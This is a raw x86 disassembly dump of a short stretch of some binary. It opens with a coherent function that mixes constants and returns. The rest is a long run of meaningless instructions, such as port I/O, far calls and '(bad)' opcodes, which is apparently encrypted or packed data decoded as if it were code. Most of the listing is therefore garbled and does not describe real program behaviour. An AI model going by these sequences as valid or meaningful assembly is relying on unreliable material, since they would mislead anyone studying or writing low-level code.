  419e27:	mov    eax,0xf89c8585
  419e2c:	mov    DWORD PTR [ebp-0x8],eax
  419e2f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  419e36:	mov    ecx,DWORD PTR [ebp-0x8]
  419e39:	xor    ecx,0x751089b
  419e3f:	add    ecx,0x3272e2
  419e45:	mov    DWORD PTR [ebp-0x4],ecx
  419e48:	mov    ecx,DWORD PTR [ebp+0xc]
  419e4b:	push   eax
  419e4c:	mov    DWORD PTR [ebp+0xc],ecx
  419e4f:	push   DWORD PTR [ebp+0xc]
  419e52:	lea    eax,[ebp-0x4]
  419e55:	push   DWORD PTR [ebp+0x8]
  419e58:	push   eax
  419e59:	push   DWORD PTR [ebp+0xc]
  419e5c:	push   DWORD PTR [ebp-0xc]
  419e5f:	push   DWORD PTR [ebp-0x8]
  419e62:	call   0x419caa
  419e67:	mov    DWORD PTR [ebp-0x4],eax
  419e6a:	mov    eax,DWORD PTR [ebp-0x4]
  419e6d:	leave  
  419e6e:	ret    0x8
  419e71:	dec    esp
  419e72:	inc    ecx
  419e73:	mov    ebp,0xeffebd16
  419e78:	pop    ebx
  419e79:	xchg   ebx,eax
  419e7a:	and    DWORD PTR [ebx-0x47],0xb0c97c0d
  419e81:	gs sbb al,0x1
  419e84:	add    BYTE PTR [ebx-0x71fffffd],ch
  419e8a:	xchg   DWORD PTR [ebx-0x1a],ecx
  419e8d:	ins    BYTE PTR es:[edi],dx
  419e8e:	mov    eax,ds:0x9b2defcf
  419e93:	xchg   esi,eax
  419e94:	pop    es
  419e95:	push   ecx
  419e96:	mov    DWORD PTR [edi+0x2],esp
  419e99:	push   es
  419e9a:	es iret 
  419e9c:	and    eax,0x56040f1f
  419ea1:	cli    
  419ea2:	and    BYTE PTR [esi+0x28],bh
  419ea5:	mov    edx,0xb8879932
  419eaa:	or     dh,BYTE PTR [edx+0x2f]
  419ead:	pop    ebx
  419eae:	cdq    
  419eaf:	or     eax,0xb6c211ab
  419eb4:	inc    edi
  419eb5:	and    ch,BYTE PTR [edx+0x4f]
  419eb8:	popf   
  419eb9:	push   0xa7e0eb9a
  419ebe:	retf   0xe0e5
  419ec1:	(bad)  
  419ec2:	fmul   DWORD PTR [ecx+0x668769d2]
  419ec8:	mov    dh,al
  419eca:	stos   BYTE PTR es:[edi],al
  419ecb:	cmp    DWORD PTR [eax+0x8],ebx
  419ece:	add    al,0x14
  419ed0:	and    bl,BYTE PTR [si-0x566c]
  419ed5:	fwait
  419ed6:	mov    edx,0x99793c1
  419edb:	push   ebx
  419edc:	repz adc DWORD PTR [edi+eax*8-0x49eb9b7f],esp
  419ee4:	movaps xmm6,xmm5
  419ee7:	pop    edx
  419ee8:	aam    0x95
  419eea:	pop    ecx
  419eeb:	int3   
  419eec:	sbb    al,0xf0
  419eee:	xchg   BYTE PTR [edi],bl
  419ef0:	loop   0x419eae
  419ef2:	scas   al,BYTE PTR es:[edi]
  419ef3:	adc    BYTE PTR [ecx],bh
  419ef5:	ins    BYTE PTR es:[edi],dx
  419ef6:	je     0x419ebc
  419ef8:	outs   dx,BYTE PTR ds:[esi]
  419ef9:	test   eax,0x67ea80a0
  419efe:	mov    ds:0x7aab4037,al
  419f03:	and    edi,DWORD PTR [eax]
  419f05:	mov    DWORD PTR [eax-0x65a1a5d4],edi
  419f0b:	or     DWORD PTR [eax-0x7d],eax
  419f0e:	data16 sbb al,0xd3
  419f11:	cdq    
  419f12:	cmp    esp,DWORD PTR [edx+0x2e]
  419f15:	lahf   
  419f16:	pushf  
  419f17:	xchg   DWORD PTR [eax],ebp
  419f19:	mov    dh,0x4f
  419f1b:	cli    
  419f1c:	push   ss
  419f1d:	or     DWORD PTR [ebp-0x6402c507],eax
  419f23:	or     BYTE PTR [esi],ch
  419f25:	or     dl,bh
  419f27:	jo     0x419ef3
  419f29:	(bad)  
  419f2a:	stc    
  419f2b:	pop    eax
  419f2c:	or     al,0x7f
  419f2e:	aas    
  419f2f:	dec    ebp
  419f30:	pop    ecx
  419f31:	xchg   edi,eax
  419f32:	mov    esp,0x4c1d4a6
  419f37:	mov    dh,0x37
  419f39:	sbb    bl,BYTE PTR [ebx]
  419f3b:	jns    0x419f8c
  419f3d:	push   ss
  419f3e:	and    BYTE PTR [edx],dh
  419f40:	jb     0x419ef3
  419f42:	icebp  
  419f43:	lods   eax,DWORD PTR ds:[esi]
  419f44:	into   
  419f45:	test   bl,ch
  419f47:	les    esp,FWORD PTR [esi]
  419f49:	mov    bh,0x6e
  419f4b:	adc    BYTE PTR es:[ebx+0x6c1571f6],bh
  419f52:	mov    dh,0x5
  419f54:	add    BYTE PTR [eax],cl
  419f56:	or     al,0x6
  419f58:	and    BYTE PTR [esi-0x1d],dh
  419f5b:	mov    al,0x9b
  419f5d:	mov    ebp,0x1175be7f
  419f62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f63:	jb     0x419fb9
  419f65:	pop    ss
  419f66:	mov    DWORD PTR [eax-0x501f82be],ebp
  419f6c:	add    BYTE PTR [ebp+0x78],dh
  419f6f:	fwait
  419f70:	lock adc ah,BYTE PTR [edi+0x5458e405]
  419f77:	xor    esi,DWORD PTR [edi+0xabc2990]
  419f7d:	mov    esp,0x8043df9e
  419f82:	and    BYTE PTR [esi],0x74
  419f85:	adc    al,0x6c
  419f87:	fldcw  WORD PTR [edi]
  419f89:	adc    al,0x62
  419f8b:	inc    esp
  419f8c:	call   DWORD PTR [edi+eiz*4+0x2ff42b3f]
  419f93:	xor    ebp,0x45193d7f
  419f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f9a:	div    DWORD PTR [edx]
  419f9c:	xor    al,cl
  419f9e:	enter  0x4ec0,0xc1
  419fa2:	push   edx
  419fa3:	mov    edi,0xa50f15ec
  419fa8:	popf   
  419fa9:	pushf  
  419faa:	xor    BYTE PTR [edx+0x59],dl
  419fad:	mov    eax,gs:0xf839b7c8
  419fb3:	dec    edx
  419fb4:	lahf   
  419fb5:	fwait
  419fb6:	pop    ss
  419fb7:	dec    esi
  419fb8:	out    0x7f,eax
  419fba:	out    0xaa,al
  419fbc:	inc    BYTE PTR [edi+0x1ee98093]
  419fc2:	imul   edx,DWORD PTR [esi+0x75f6d9e],0x4f28f69d
  419fcc:	sbb    ah,bh
  419fce:	xor    DWORD PTR [ecx-0xa1a4954],ecx
  419fd4:	into   
  419fd5:	xchg   ecx,eax
  419fd6:	popf   
  419fd7:	int    0x14
  419fd9:	inc    ecx
  419fda:	fstp   QWORD PTR [esp+ebx*4-0x6af6cf62]
  419fe1:	imul   ebp,DWORD PTR ds:0xc5f7c5fe,0xb29fbf06
  419feb:	push   ss
  419fec:	sbb    ecx,ebp
  419fee:	ror    BYTE PTR [edx+0x368a4585],cl
  419ff4:	lds    ebx,FWORD PTR [edx+ebx*4]
  419ff7:	aas    
  419ff8:	out    dx,al
  419ff9:	loope  0x41a02c
  419ffb:	dec    eax
  419ffc:	(bad)  
  419ffd:	lahf   
  419ffe:	fld    QWORD PTR [ebx+0x45]
  41a001:	sbb    eax,esi
  41a003:	shr    DWORD PTR [edi+0x58cf3660],0xb5
  41a00a:	adc    BYTE PTR [ebp+0x5e72b950],dh
  41a010:	mov    dl,0xea
  41a012:	push   edx
  41a013:	leave  
  41a014:	mov    ecx,0xb33ff29e
  41a019:	inc    ebx
  41a01a:	outs   dx,BYTE PTR ds:[esi]
  41a01b:	and    edx,DWORD PTR [edi-0x36]
  41a01e:	xchg   edi,eax
  41a01f:	retf   
  41a020:	rcr    DWORD PTR [esi-0x46],1
  41a023:	pop    ecx
  41a024:	or     al,0xb9
  41a026:	mov    ah,0x9f
  41a028:	dec    esi
  41a029:	mov    dl,0x67
  41a02b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a02c:	xor    dl,BYTE PTR [esi+0x7f89645e]
  41a032:	cdq    
  41a033:	data16 fs data16 sahf 
  41a037:	or     BYTE PTR ds:0x7c019708,bh
  41a03d:	test   eax,0xbe5b2565
  41a042:	clc    
  41a043:	mov    ah,0x33
  41a045:	nop
  41a046:	xchg   ebx,eax
  41a047:	push   ecx
  41a048:	stc    
  41a049:	xchg   esp,eax
  41a04a:	mov    edi,esp
  41a04c:	in     al,dx
  41a04d:	xchg   ebx,eax
  41a04e:	outs   dx,BYTE PTR ds:[esi]
  41a04f:	jle    0x41a072
  41a051:	xor    DWORD PTR [ebp+0x3e405e85],ecx
  41a057:	mov    dh,0xdf
  41a059:	sti    
  41a05a:	push   ds
  41a05b:	das    
  41a05c:	scas   eax,DWORD PTR es:[edi]
  41a05d:	cmc    
  41a05e:	xchg   edx,eax
  41a05f:	nop
  41a060:	mov    bl,0x2c
  41a062:	in     eax,dx
  41a063:	mov    eax,0x933325a4
  41a068:	add    DWORD PTR [esi],esp
  41a06a:	sbb    al,cl
  41a06c:	addr16 (bad) 
  41a06f:	fidivr DWORD PTR [ebx+0x10]
  41a072:	pushf  
  41a073:	and    DWORD PTR [edx+0x4b0dff9c],0x186d79f6
  41a07d:	daa    
  41a07e:	imul   ebp,DWORD PTR [ebx],0x571f68ca
  41a084:	ds stos DWORD PTR es:[edi],eax
  41a086:	fsub   st(6),st
  41a088:	arpl   sp,dx
  41a08a:	xor    edx,ecx
  41a08c:	stos   BYTE PTR es:[edi],al
  41a08d:	sbb    bl,BYTE PTR [esi]
  41a08f:	cdq    
  41a090:	and    esp,edi
  41a092:	pop    es
  41a093:	mov    edi,0xedccfa9e
  41a098:	add    eax,ebx
  41a09a:	or     DWORD PTR [ecx-0x49],esp
  41a09d:	xchg   DWORD PTR [esi-0x33],edi
  41a0a0:	cmp    DWORD PTR es:[esi-0x38],ebx
  41a0a4:	cwde   
  41a0a5:	int    0xed
  41a0a7:	out    0x11,al
  41a0a9:	imul   ebp,DWORD PTR [esi+0x47],0xfb70df65
  41a0b0:	sbb    eax,0xec7040c0
  41a0b5:	mov    dl,0x31
  41a0b7:	test   eax,0xaa8e406
  41a0bc:	or     DWORD PTR [eax-0x2e6235a6],esp
  41a0c2:	or     dh,BYTE PTR [edx*8+0x61e9931d]
  41a0c9:	rcl    DWORD PTR [eax],1
  41a0cb:	cmp    DWORD PTR [edi-0x6],edi
  41a0ce:	sbb    bl,ah
  41a0d0:	lods   eax,DWORD PTR ds:[esi]
  41a0d1:	jmp    0x41a143
  41a0d3:	push   edx
  41a0d4:	cdq    
  41a0d5:	mov    cl,0x17
  41a0d7:	adc    DWORD PTR [ebx+esi*8-0x34bb2d29],0xffffffd7
  41a0df:	add    cl,bh
  41a0e1:	inc    BYTE PTR [edi+0x579aaab8]
  41a0e7:	sub    al,0xcf
  41a0e9:	sub    eax,0xeb9c6668
  41a0ee:	lods   eax,DWORD PTR ds:[esi]
  41a0ef:	aas    
  41a0f0:	cdq    
  41a0f1:	leave  
  41a0f2:	lock or dh,BYTE PTR [eax]
  41a0f5:	aas    
  41a0f6:	stos   DWORD PTR es:[edi],eax
  41a0f7:	sbb    edx,edi
  41a0f9:	les    esi,FWORD PTR [esi+0x5f]
  41a0fc:	pop    esp
  41a0fd:	retf   
  41a0fe:	push   ss
  41a0ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a100:	shl    BYTE PTR [esi+0x13],1
  41a103:	lea    edi,[edi]
  41a105:	test   al,0xe1
  41a107:	sub    dh,BYTE PTR [edi+0x5b]
  41a10a:	fcomp  st(5)
  41a10c:	cld    
  41a10d:	mov    ebx,0x70a703c6
  41a112:	mov    ch,0x11
  41a114:	and    BYTE PTR [esi+0x79],bl
  41a117:	std    
  41a118:	cmc    
  41a119:	or     DWORD PTR [edx+0x11],edx
  41a11c:	pushf  
  41a11d:	or     BYTE PTR [edx+0x4b],al
  41a120:	pop    eax
  41a121:	jecxz  0x41a195
  41a123:	or     bl,cl
  41a125:	(bad)  
  41a126:	jle    0x41a148
  41a128:	xchg   edi,eax
  41a129:	(bad)  
  41a12a:	and    DWORD PTR [edi],eax
  41a12c:	stc    
  41a12d:	push   edi
  41a12e:	xchg   edi,eax
  41a12f:	lods   al,BYTE PTR ds:[esi]
  41a130:	shl    DWORD PTR [esi-0x1c70f07a],cl
  41a136:	lea    edi,[edi+esi*2+0x27]
  41a13a:	in     eax,dx
  41a13b:	test   eax,0x769b8edd
  41a140:	imul   ecx,DWORD PTR ds:0x8c763c9b,0xaeee9c8d
  41a14a:	(bad)  
  41a14b:	loope  0x41a12f
  41a14d:	stos   DWORD PTR es:[edi],eax
  41a14e:	nop
  41a14f:	add    dl,cl
  41a151:	sub    DWORD PTR [edi-0x663c1f09],ebx
  41a157:	mov    eax,DWORD PTR ds:0x22d4986e
  41a15d:	in     eax,dx
  41a15e:	lock shl bl,0x8d
  41a162:	das    
  41a163:	push   esp
  41a164:	fwait
  41a165:	adc    BYTE PTR [ecx],dl
  41a167:	sub    DWORD PTR [edi],0xf
  41a16a:	sbb    esi,ecx
  41a16c:	das    
  41a16d:	test   DWORD PTR [ebx+0x639adba0],esi
  41a173:	sbb    DWORD PTR [ecx+eax*8+0x79],eax
  41a177:	push   ds
  41a178:	lds    eax,FWORD PTR [edx+0x12]
  41a17b:	lods   al,BYTE PTR ds:[esi]
  41a17c:	inc    esp
  41a17d:	enter  0x2bd6,0xc0
  41a181:	fcomip st,st(5)
  41a183:	imul   esp,ebp,0xe6eb45ea
  41a189:	mov    cl,0xb3
  41a18b:	cs aas 
  41a18d:	out    0x32,eax
  41a18f:	xchg   esi,eax
  41a190:	pop    eax
  41a191:	sub    eax,0x98752ce6
  41a196:	call   0x6755:0x9940a2f8
  41a19d:	xor    DWORD PTR [edx+0x205ba2d5],0x98bb42fa
  41a1a7:	adc    esi,DWORD PTR [edx-0x70ef68e6]
  41a1ad:	rcl    BYTE PTR [ebx-0x40],1
  41a1b0:	gs dec esi
  41a1b2:	xor    BYTE PTR [edi-0x2fcf7889],dh
  41a1b8:	dec    esp
  41a1b9:	int3   
  41a1ba:	or     al,BYTE PTR [ecx+0x6a]
  41a1bd:	push   ecx
  41a1be:	mov    eax,0xa827a63f
  41a1c3:	mov    ebp,0x3f2d556
  41a1c8:	cmp    dh,ch
  41a1ca:	pop    ecx
  41a1cb:	mov    eax,ds:0x3725f4ea
  41a1d0:	rcr    dh,cl
  41a1d2:	icebp  
  41a1d3:	enter  0x84d5,0x2c
  41a1d7:	mov    WORD PTR [esi+ebx*2-0x1b],gs
  41a1db:	push   edi
  41a1dc:	pop    es
  41a1dd:	and    edi,DWORD PTR [edi+edx*2]
  41a1e0:	mov    ah,0x17
  41a1e2:	cmp    DWORD PTR [ecx],esi
  41a1e4:	sub    BYTE PTR [ecx-0x7435a236],al
  41a1ea:	and    al,0xe8
  41a1ec:	mov    bl,0xc5
  41a1ee:	int    0x8d
  41a1f0:	daa    
  41a1f1:	lods   al,BYTE PTR ds:[esi]
  41a1f2:	ret    0x469c
  41a1f5:	pop    eax
  41a1f6:	imul   esp,edi,0xb
  41a1f9:	aaa    
  41a1fa:	mov    bl,0xe9
  41a1fc:	sbb    BYTE PTR [ecx+edi*4+0x2ee9bf2d],bh
  41a203:	test   al,bh
  41a205:	xchg   esi,eax
  41a206:	and    al,0xb
  41a208:	cli    
  41a209:	ds lock push eax
  41a20c:	fistp  WORD PTR [ebp-0x4a81f7b4]
  41a212:	dec    ebp
  41a213:	push   esi
  41a214:	push   ebp
  41a215:	xchg   ebx,eax
  41a216:	sar    DWORD PTR [edi-0x78],0x95
  41a21a:	dec    edx
  41a21b:	rcl    al,0x4c
  41a21e:	xchg   esp,eax
  41a21f:	pusha  
  41a220:	push   ebx
  41a221:	sub    DWORD PTR [esi-0x1a],eax
  41a224:	mov    eax,ds:0x5b96a90f
  41a229:	nop
  41a22a:	aas    
  41a22b:	mov    eax,ds:0xd4f0705
  41a230:	fbstp  TBYTE PTR [edi+eax*1]
  41a233:	add    BYTE PTR cs:[eax],al
	...
  41a23e:	add    BYTE PTR [eax],al
  41a240:	add    BYTE PTR [esi-0x105c14ff],ch
  41a246:	jmp    0x41a236
  41a248:	or     eax,0x116c2f8b
  41a24d:	in     eax,dx
  41a24e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a24f:	or     cl,BYTE PTR [ebx+0x12010]
  41a255:	stos   DWORD PTR es:[edi],eax
  41a256:	add    eax,DWORD PTR [eax]
  41a258:	add    ch,ah
  41a25a:	dec    ebp
  41a25b:	fidiv  DWORD PTR [eax]
  41a25d:	jno    0x41a250
  41a25f:	imul   ecx,DWORD PTR [ebp+0x23e3a60d],0xfdd9fe52
  41a269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a26a:	out    0x6,eax
  41a26c:	mov    esi,0x8bbb938a
  41a271:	jno    0x41a247
  41a273:	iret   
  41a274:	pop    esp
  41a275:	add    al,0xca
  41a277:	add    eax,0xc051b3c0
  41a27c:	loope  0x41a24a
  41a27e:	add    eax,0x671bddd6
  41a283:	mov    esi,0xa4d681a8
  41a288:	(bad)  
  41a289:	scas   al,BYTE PTR es:[edi]
  41a28a:	xor    BYTE PTR [esi+ecx*4],ah
  41a28d:	pushf  
  41a28e:	push   esi
  41a28f:	inc    ebx
  41a290:	mov    dl,0x57
  41a292:	ret    0x2ed6
  41a295:	cmp    DWORD PTR [edi-0xc2a9b9f],esi
  41a29b:	in     al,dx
  41a29c:	fist   DWORD PTR [esi+ebx*2]
  41a29f:	mov    ds:0x462ef084,al
  41a2a4:	call   0x6f38d8ab
  41a2a9:	push   eax
  41a2aa:	orps   xmm3,xmm0
  41a2ad:	dec    eax
  41a2ae:	outs   dx,DWORD PTR ds:[esi]
  41a2af:	ins    DWORD PTR es:[edi],dx
  41a2b0:	test   DWORD PTR [esi-0x68138219],ecx
  41a2b6:	(bad)  
  41a2b7:	loope  0x41a2ad
  41a2b9:	in     eax,0x9
  41a2bb:	ins    DWORD PTR es:[edi],dx
  41a2bc:	xlat   BYTE PTR ds:[ebx]
  41a2bd:	aam    0x8f
  41a2bf:	sub    DWORD PTR [edi+0x6f42c87b],ecx
  41a2c5:	mov    ebp,edx
  41a2c7:	mov    eax,0xdeef2aa4
  41a2cc:	mov    cl,0xfd
  41a2ce:	pop    eax
  41a2cf:	xor    edi,DWORD PTR [edi-0xe]
  41a2d2:	out    0xd3,eax
  41a2d4:	mov    fs,edx
  41a2d6:	repz and DWORD PTR [esi-0x24],ecx
  41a2da:	mov    ch,BYTE PTR [eax]
  41a2dc:	sbb    al,ah
  41a2de:	fsub   st,st(1)
  41a2e0:	add    al,0x31
  41a2e2:	int3   
  41a2e3:	ja     0x41a2db
  41a2e5:	ret    0xa10b
  41a2e8:	aad    0xa8
  41a2ea:	cmc    
  41a2eb:	into   
  41a2ec:	xchg   ebp,eax
  41a2ed:	jnp    0x41a31b
  41a2ef:	push   esp
  41a2f0:	pusha  
  41a2f1:	dec    esp
  41a2f2:	not    DWORD PTR [ebx-0x3d]
  41a2f5:	test   DWORD PTR ds:0x1301917e,edi
  41a2fb:	std    
  41a2fc:	jo     0x41a2a5
  41a2fe:	(bad)  
  41a300:	aaa    
  41a301:	cli    
  41a302:	cmp    BYTE PTR [edx+0x3fe38e23],al
  41a308:	adc    DWORD PTR [ebx-0x73],ecx
  41a30b:	mov    esp,0x6a8c9ca
  41a310:	data16 cmp dh,cl
  41a313:	jmp    0x41a2a7
  41a315:	cwde   
  41a316:	and    ah,BYTE PTR [ebx+0x762539a5]
  41a31c:	daa    
  41a31d:	lds    eax,FWORD PTR [eax-0x67]
  41a320:	iret   
  41a321:	sahf   
  41a322:	outs   dx,DWORD PTR ds:[esi]
  41a323:	das    
  41a324:	xor    bh,ah
  41a326:	push   es
  41a327:	fs or  al,0xc7
  41a32a:	mov    ah,0xb4
  41a32c:	arpl   WORD PTR [ebx],bp
  41a32e:	inc    ebp
  41a32f:	ret    0xadab
  41a332:	push   edx
  41a333:	inc    eax
  41a334:	outs   dx,BYTE PTR ds:[esi]
  41a335:	lahf   
  41a336:	enter  0x6326,0xb5
  41a33a:	add    ebp,DWORD PTR [eax+eiz*8+0x2f]
  41a33e:	jo     0x41a358
  41a340:	shl    eax,1
  41a342:	(bad)  
  41a343:	jl     0x41a35f
  41a345:	imul   edx,DWORD PTR [ebp+0x3757b644],0x41
  41a34c:	pushf  
  41a34d:	mov    eax,ds:0xa346c894
  41a352:	fsubr  st,st(6)
  41a354:	jecxz  0x41a2ec
  41a356:	inc    ecx
  41a357:	rcr    BYTE PTR [esi+0x56ae3786],cl
  41a35d:	mov    esp,0xf675009e
  41a362:	fdivr  DWORD PTR [eax-0x1190e796]
  41a368:	or     eax,0x7094b1b1
  41a36d:	shl    dh,1
  41a36f:	adc    al,0xc
  41a371:	and    al,0xea
  41a373:	fisttp DWORD PTR [eax]
  41a375:	push   esi
  41a376:	hlt    
  41a377:	(bad)  
  41a378:	pop    edi
  41a379:	je     0x41a3d9
  41a37b:	mov    ebx,0xa3b5d92c
  41a380:	sub    dh,BYTE PTR [ecx-0x46309a63]
  41a386:	stc    
  41a387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a388:	int3   
  41a389:	scas   eax,DWORD PTR es:[edi]
  41a38a:	xor    ch,cl
  41a38c:	xchg   ebp,eax
  41a38d:	xor    al,0xfd
  41a38f:	ss xchg edx,eax
  41a391:	int    0x4f
  41a393:	call   0x1f:0x65165cf1
  41a39a:	and    ch,BYTE PTR [esi-0x36]
  41a39d:	jae    0x41a32c
  41a39f:	xchg   edx,eax
  41a3a0:	inc    esp
  41a3a1:	jle    0x41a36a
  41a3a3:	push   edi
  41a3a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3a5:	jg     0x41a40d
  41a3a7:	sahf   
  41a3a8:	fnstenv ds:0xd1cf5cdc
  41a3ae:	js     0x41a378
  41a3b0:	test   al,0xd9
  41a3b2:	jp     0x41a399
  41a3b4:	or     eax,0x13a4c3fa
  41a3b9:	jmp    0x82c653d1
  41a3be:	popa   
  41a3bf:	std    
  41a3c0:	je     0x41a43b
  41a3c2:	mov    ch,0x68
  41a3c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3c5:	mov    ah,0xbf
  41a3c7:	push   ds
  41a3c8:	pop    esp
  41a3c9:	aad    0xb4
  41a3cb:	pop    esi
  41a3cc:	mov    eax,DWORD PTR [ebx+0x5]
  41a3cf:	xchg   esi,eax
  41a3d0:	mov    ah,bh
  41a3d2:	add    DWORD PTR [ebp+0x575678a],edi
  41a3d8:	mov    eax,0xe54eed8
  41a3dd:	inc    esp
  41a3de:	xor    bl,dl
  41a3e0:	cmp    eax,0xb7b29952
  41a3e5:	adc    eax,0x35879082
  41a3ea:	imul   eax,DWORD PTR [ebx],0x75c78111
  41a3f0:	inc    ecx
  41a3f1:	cdq    
  41a3f2:	cmp    eax,DWORD PTR [ecx+0x1d679e20]
  41a3f8:	jl     0x41a37f
  41a3fa:	cmp    al,0x74
  41a3fc:	or     BYTE PTR [ebx+0x5],dh
  41a3ff:	retf   
  41a400:	push   esp
  41a401:	adc    DWORD PTR [eax],edx
  41a403:	sub    DWORD PTR [ecx],edi
  41a405:	ins    BYTE PTR es:[edi],dx
  41a406:	aad    0xfc
  41a408:	xor    ebp,DWORD PTR [ebx]
  41a40a:	sub    bl,BYTE PTR [eax]
  41a40c:	cmp    eax,0xd42a7e8c
  41a411:	add    bl,BYTE PTR [ecx]
  41a413:	add    dl,dh
  41a415:	hlt    
  41a416:	popf   
  41a417:	add    ah,BYTE PTR [ecx]
  41a419:	fdiv   QWORD PTR [eax+ebx*4]
  41a41c:	test   eax,0xe10124b0
  41a421:	adc    BYTE PTR [ebx-0x1d],bh
  41a424:	pop    ebp
  41a425:	scas   al,BYTE PTR es:[edi]
  41a426:	mov    esi,0x5663ebf5
  41a42b:	pop    ds
  41a42c:	aad    0x6b
  41a42e:	push   ebp
  41a42f:	dec    edi
  41a430:	aad    0x87
  41a432:	xchg   esp,eax
  41a433:	aaa    
  41a434:	inc    eax
  41a435:	add    ebp,eax
  41a437:	jp     0x41a484
  41a439:	mov    BYTE PTR [eax],bh
  41a43b:	loope  0x41a49f
  41a43d:	inc    ebx
  41a43e:	mov    WORD PTR [esi-0x64],cs
  41a441:	push   ebp
  41a442:	pop    eax
  41a443:	imul   bl
  41a445:	mov    al,0x5a
  41a447:	xor    esp,DWORD PTR [ecx+ebp*2+0x6e6abe87]
  41a44e:	cld    
  41a44f:	add    cl,ch
  41a451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a452:	mov    dl,0xea
  41a454:	xor    eax,DWORD PTR [edx]
  41a456:	pop    ss
  41a457:	dec    esi
  41a458:	adc    BYTE PTR [esp+edx*1],bl
  41a45b:	jmp    0xdcbab0a7
  41a460:	out    dx,al
  41a461:	std    
  41a462:	int    0x5a
  41a464:	cmp    esi,ebp
  41a466:	xor    al,0xb8
  41a468:	cmp    al,0x6d
  41a46a:	xor    bl,bl
  41a46c:	fldenv [eax-0x43]
  41a46f:	dec    esi
  41a470:	pop    ds
  41a471:	or     BYTE PTR [ebx],0xf9
  41a474:	or     ecx,edx
  41a476:	lock push edi
  41a478:	mov    dh,0x9d
  41a47a:	or     cl,BYTE PTR [ebx]
  41a47c:	ret    
  41a47d:	and    ah,BYTE PTR [edx+esi*4+0x250287de]
  41a484:	fisubr DWORD PTR [esi-0x51]
  41a487:	jge    0x41a423
  41a489:	jo     0x41a4cc
  41a48b:	fcom   DWORD PTR [edx-0x34]
  41a48e:	inc    edi
  41a48f:	aad    0x79
  41a491:	inc    esp
  41a492:	das    
  41a493:	aaa    
  41a494:	scas   al,BYTE PTR es:[edi]
  41a495:	cmp    al,0x53
  41a497:	ja     0x41a4ea
  41a499:	xchg   ecx,eax
  41a49a:	rcr    DWORD PTR [edx+0x2],0x29
  41a49e:	test   eax,0x87c75a39
  41a4a3:	push   ss
  41a4a4:	cmp    eax,0x133d4fe5
  41a4a9:	fadd   DWORD PTR [edi+0x53]
  41a4ac:	pusha  
  41a4ad:	aas    
  41a4ae:	xchg   DWORD PTR [eax],edi
  41a4b0:	mov    DWORD PTR [esi],ecx
  41a4b2:	mov    bh,0x36
  41a4b4:	es push cs
  41a4b6:	lods   al,BYTE PTR ds:[esi]
  41a4b7:	outs   dx,DWORD PTR ds:[esi]
  41a4b8:	or     eax,0x6d737933
  41a4bd:	popa   
  41a4be:	scas   al,BYTE PTR es:[edi]
  41a4bf:	cmp    edi,DWORD PTR [ebx]
  41a4c1:	and    ah,BYTE PTR [ecx+0x197a0f37]
  41a4c7:	xor    eax,0x88ecf43a
  41a4cc:	outs   dx,BYTE PTR ds:[esi]
  41a4cd:	mov    eax,edi
  41a4cf:	pop    edi
  41a4d0:	push   ebx
  41a4d1:	ja     0x41a52d
  41a4d3:	push   edx
  41a4d4:	fnstenv [eax+eiz*4-0x3cc85c76]
  41a4db:	xchg   edx,eax
  41a4dc:	aaa    
  41a4dd:	cmp    eax,0x1d1b857c
  41a4e2:	test   DWORD PTR [eax+esi*4],edx
  41a4e5:	jp     0x41a563
  41a4e7:	inc    ebx
  41a4e8:	or     al,0xc
  41a4ea:	retf   
  41a4eb:	scas   eax,DWORD PTR es:[edi]
  41a4ec:	test   eax,0x8675b121
  41a4f1:	sbb    eax,0x48cef6d5
  41a4f6:	adc    edx,DWORD PTR [edx-0x5f]
  41a4f9:	mov    esp,0x860f4dc8
  41a4fe:	hlt    
  41a4ff:	ror    DWORD PTR [ebx],1
  41a501:	loopne 0x41a511
  41a503:	mov    ebp,0x6b27d3aa
  41a508:	and    bl,bl
  41a50a:	sbb    eax,0x972c729
  41a50f:	ds push eax
  41a511:	fcom   QWORD PTR [ebp-0x28]
  41a514:	xchg   esi,eax
  41a515:	jno    0x41a569
  41a517:	lahf   
  41a518:	out    0x4d,eax
  41a51a:	mov    ch,0x61
  41a51c:	xor    ebp,edx
  41a51e:	stos   BYTE PTR es:[edi],al
  41a51f:	pop    ss
  41a520:	push   ss
  41a521:	mov    dl,0x4b
  41a523:	lods   eax,DWORD PTR ds:[esi]
  41a524:	dec    esi
  41a525:	pop    esi
  41a526:	xchg   esp,eax
  41a527:	mov    ds:0x4fed33b7,al
  41a52c:	sbb    ah,BYTE PTR [ebp-0x34cc6be2]
  41a532:	(bad)  
  41a534:	mov    es,eax
  41a536:	pushf  
  41a537:	and    eax,0x21bc875c
  41a53c:	gs jne 0x41a57e
  41a53f:	push   ecx
  41a540:	arpl   WORD PTR [eax+0x42],cx
  41a543:	pop    ebx
  41a544:	push   0xffffff88
  41a546:	jne    0x41a4ff
  41a548:	inc    edx
  41a549:	mov    esp,0xc5ba08c0
  41a54e:	mov    ch,0x86
  41a550:	pop    esi
  41a551:	or     al,0x45
  41a553:	mov    eax,ds:0xefcd0694
  41a558:	es xchg edi,edi
  41a55b:	mov    dl,0xbc
  41a55d:	or     bl,0x97
  41a560:	pushf  
  41a561:	pop    ecx
  41a562:	and    al,0x73
  41a564:	ja     0x41a4eb
  41a566:	mov    ah,0x47
  41a568:	mov    ds,WORD PTR [esi+0x7827c330]
  41a56e:	fldenv [ecx]
  41a570:	mov    ch,0xf9
  41a572:	shl    BYTE PTR [ecx+0x101ae85f],0xb1
  41a579:	push   es
  41a57a:	mov    edi,0xf2a7c5d8
  41a57f:	sub    al,0x7e
  41a581:	aas    
  41a582:	enter  0x8747,0x50
  41a586:	inc    esi
  41a587:	(bad)  
  41a588:	fcomp  QWORD PTR [esi+0x7f9f1880]
  41a58e:	lahf   
  41a58f:	jns    0x41a56f
  41a591:	mov    esi,0x2bd9bb1a
  41a596:	xor    al,0x4f
  41a598:	jp     0x41a550
  41a59a:	fisubr DWORD PTR [edi+0x6f]
  41a59d:	in     eax,dx
